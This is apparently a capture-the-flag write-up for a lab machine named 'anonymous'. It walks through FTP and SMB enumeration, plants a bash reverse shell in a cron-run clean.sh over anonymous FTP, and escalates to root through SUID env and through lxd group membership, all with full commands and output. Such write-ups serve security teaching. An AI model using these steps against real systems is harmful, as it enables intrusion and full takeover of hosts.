# Recon
Like always, start with nmap. I use my own tool to automate nmap scan, check it out [pymap](https://github.com/gu2rks/pymap)
```console
$ python3 pymap.py -t $IP
```
it took 20 sec with the tool. sum up, 4 open ports:
- 21/tcp  open  ftp
  - ftp-anon: Anonymous FTP login allowed (FTP code 230)
- 22/tcp  open  ssh
- 139/tcp open  netbios-ssn
- 445/tcp open  microsoft-ds
  - samba file share
## FTP
connect to ftp server and get everything we can. we will examine it later.
```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          357 Aug 08 14:48 clean.sh
-rw-rw-r--    1 1000     1000         2021 Aug 08 14:48 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
```
## SMB
now let use `pymap.py` again to enumerate for smb
```console
kali@kali:~/script$ sudo python3 pymap.py -t $IP -smb
created by gu2rks/kurohat 
find me here https://github.com/gu2rks

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-08 10:25 EDT
Nmap scan report for 10.10.155.248
Host is up (0.041s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.155.248\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (anonymous server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.155.248\pics: 
|     Type: STYPE_DISKTREE
|     Comment: My SMB Share Directory for Pics
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\namelessone\pics
|     Anonymous access: READ
|     Current user access: READ
|   \\10.10.155.248\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 7.01 seconds
```
seem like we can access `\pics` with out anonymously. let get whatever we can so we can examine it later.

```console
kali@kali:~/THM/anonymous$ smbclient \\\\$IP\\pics
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ks
ks: command not found
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Sat Aug  8 11:04:59 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

		20508240 blocks of size 1024. 13262808 blocks available
smb: \> 
```

## Examining all files from ftp and smb
ther are two pictures on smb, *corgo2.jpg* and *puppos.jpeg*. I used `exiftool` to check metadata and `hexeiditor` to look for weird hex patterns. Unfortunately, I can find anything.. to be save, I use `stegocracker` to crack them while I start examining files from `ftp`

from ftp, we got 3 files
1. to_do.txt
```
I really need to disable the anonymous login...it's really not safe
```
okey I think we hit the jackport here. there is something that is **NOT SAFE** on FTP
2. removed_files.log: contains
```
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
that text keep repeating again and again...
3. clean.sh: contains
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
so if varible `tmp_files` is 0 then it will add "Running cleanup script:  nothing to delete" in `removed_files.log` which is another file we found in FTP (above)


At this point, I assume that there is a cronjob that keep execute `clean.sh` since `removed_files.log` contains many "Running cleanup script:  nothing to delete" in the files. To prof that, we can connect to ftp again and try to `ls -la` and check the last modified time on `removed_files.log`.

![clean.sh](../pic/Screenshot%202020-08-08%20at%2016.44.37.png)


Bingo! my assumtion is correct. as you can se the last modified time on `removed_files.log` changed from **14.43** to **14.44**. This prof that there is a cronjob that execute `clean.sh` each minute


At this point, I stop `stegcracker` 
# Foot hold
To get the foothold on the victim server, we will modify `clean.sh` by adding a reverse shell payload. Thereafter we will put the script a back to victim server and wait for cronjob to execute it.

add ```bash -i >& /dev/tcp/<kali ip>/6969 0>&1``` to the script. it should now look like this 
```bash
#!/bin/bash

bash -i >& /dev/tcp/<kali ip>/6969 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
Then connect to ftp, run ```put clean.sh``` to upload our script, also run ```nc -nvlp 6969``` and wait for it
```console
kali@kali:~/THM/anonymous$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.11.14.220] from (UNKNOWN) [10.10.155.248] 55608
bash: cannot set terminal process group (1572): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```
now let spawn at TTY shell.
```console
namelessone@anonymous:~$ python -c 'import pty; pty.spawn("/bin/sh")'
$ id 
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
not that we cant run `sudo -l` since we dont have namelessone's password


There is 2 way to root this server
1. with [SUID](#root-with-suid)
2. with [lxd](#root-with-lxd)

# root with SUID
this way is easier that with lxd, so what do we do? Yes use amazing tool cal `suid3num.py` !! tranfer the script/tool to the victim server and run it
```

[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/env -~> https://gtfobins.github.io/gtfobins/env/#suid
```
yep we can use `env` to escalate priv. check GTFObins for more info (the link). So what let run it
```console
$ env /bin/sh -p
env /bin/sh -p
# whoami
whoami
root
# cat /root/root.txt
```
# root with lxd
*namelessone* is a user of group `lxd` and we can use it to escalate priv. how to do that? you need to read more about it [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation) or [here](https://reboare.github.io/lxd/lxd-escape.html)..

let do it then.
```console
$ which wget
which wget
/usr/bin/wget
$ wget http://10.11.14.220:8000/alpine-v3.12-x86_64-20200728_1308.tar.gz
wget http://10.11.14.220:8000/alpine-v3.12-x86_64-20200728_1308.tar.gz
--2020-08-08 14:52:09--  http://10.11.14.220:8000/alpine-v3.12-x86_64-20200728_1308.tar.gz
Connecting to 10.11.14.220:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3198971 (3.0M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200728_1308.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   3.05M   993KB/s    in 3.1s    

2020-08-08 14:52:12 (993 KB/s) - ‘alpine-v3.12-x86_64-20200728_1308.tar.gz’ saved [3198971/3198971]

$ lxc image import alpine-v3.12-x86_64-20200728_1308.tar.gz --alias kurohat
lxc image import alpine-v3.12-x86_64-20200728_1308.tar.gz --alias kurohat
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:18.04
```
seem like we need to run lxd is not created yet. let run `lxd init` and press enter for everything (create with defualt setting). now we gonna create container -> device as root. then spawn a shell to gain root privilage!!
```console
$ lxc image import alpine-v3.12-x86_64-20200728_1308.tar.gz --alias kurohat
lxc image import alpine-v3.12-x86_64-20200728_1308.tar.gz --alias kurohat
Error: Image with same fingerprint already exists
$ lxc init kurohat kurocontainer -c security.privileged=true
lxc init kurohat kurocontainer -c security.privileged=true
Creating kurocontainer
$ lxc config device add kurocontainer kurodevice disk source=/ path=/mnt/root recursive=true
lxc config device add kurocontainer kurodevice disk source=/ path=/mnt/root recursive=true
Device kurodevice added to kurocontainer
$ lxc start kurocontainer
lxc start kurocontainer
$ lxc exec kurocontainer /bin/sh
lxc exec kurocontainer /bin/sh
~ # whoami  
whoami
root
~ # ls  /mnt/root/root/
ls  /mnt/root/root/
root.txt
```



